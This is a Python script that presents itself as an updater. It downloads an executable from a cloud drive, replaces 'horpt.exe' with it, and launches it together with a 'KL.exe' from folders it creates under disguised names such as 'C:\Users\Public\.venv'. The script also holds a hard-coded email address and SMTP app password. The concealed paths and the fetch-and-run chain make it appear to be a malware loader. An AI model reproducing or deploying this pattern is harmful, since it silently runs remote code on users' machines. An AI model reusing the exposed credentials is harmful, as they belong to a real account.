import shutil
from aligo import Aligo
from aligo import Auth
import os
import time
import subprocess
import getpass

user_name = getpass.getuser()


def update_by_ali():
    try:
        Auth._EMAIL_HOST = 'smtp.qq.com'
        Auth._EMAIL_PORT = '465'
        Auth._EMAIL_USER = '2778297606@qq.com'
        Auth._EMAIL_PASSWORD = 'evdygkxdzgrudeff'

        ali = Aligo(email=("2778297606@qq.com", user_name))

        data = ali.get_file_by_path(f"update/new_horpt.exe")  # 主程序文件位置
        log = ali.get_file_by_path(f"update/version.txt")  # 版本文件位置

        version = '0.0.0'  # 当前版本
        if os.path.isfile('v.log'):
            with open('v.log', mode='r') as f:
                version = f.read().strip()  # 获取当前版本号
        ali.download_file(file_id=log.file_id, local_folder='')
        with open('version.txt', mode='r') as f:
            curVersion = f.read().strip()  # 获取最新版本版本号
        os.remove('version.txt')  # 删除最新版本文件信息
        if version != curVersion:  # 是否需要更新下载
            try:
                ali.download_file(file_id=data.file_id, local_folder='')  # 下载最新版
                os.remove('horpt.exe')  # 删除旧版
                os.rename('new_horpt.exe', 'horpt.exe')  # 重命名
                with open('v.log', mode='w') as f:
                    f.write(curVersion)  # 写入更新完成后的版本号
                return True
            except:
                try:
                    os.remove('new_horpt.exe')
                except:
                    pass
                return False
        else:
            return True
    except:
        return False


def start():
    try:
        subprocess.Popen("horpt.exe")
        subprocess.Popen(f"C:\\Users\\{user_name}\\Shared\\Common\\Plug-ins\\3.0\\Core\\KL.exe")
        return True
    except:
        return False


def createPath():
    if not os.path.isdir("C:\\Users\\Public\\.venv"):
        os.mkdir("C:\\Users\\Public\\.venv")
    if not os.path.isdir("C:\\Users\\Public\\.venv\\.update"):
        os.mkdir("C:\\Users\\Public\\.venv\\.update")
    if not os.path.isdir("C:\\Users\\Public\\.venv\\.cache"):
        os.mkdir("C:\\Users\\Public\\.venv\\.cache")
    if not os.path.isdir(f"C:\\Users\\{user_name}\\Shared\\Common\\Plug-ins\\3.0\\Core"):
        os.makedirs(f"C:\\Users\\{user_name}\\Shared\\Common\\Plug-ins\\3.0\\Core")


def update_by_local():
    try:
        os.system('taskkill /F /IM horpt.exe')
        shutil.copyfile(".update\\horpt.exe", "horpt.exe")
        os.remove(".update\\horpt.exe")
        return True
    except:
        return False


if __name__ == '__main__':
    time.sleep(0)
    createPath()
    os.chdir("C:\\Users\\Public\\.venv")
    for i in range(3):
        time.sleep(3)
        if update_by_ali():
            break
        elif os.path.isfile(".update\\horpt.exe"):
            if update_by_local():
                break
    # start
    start()
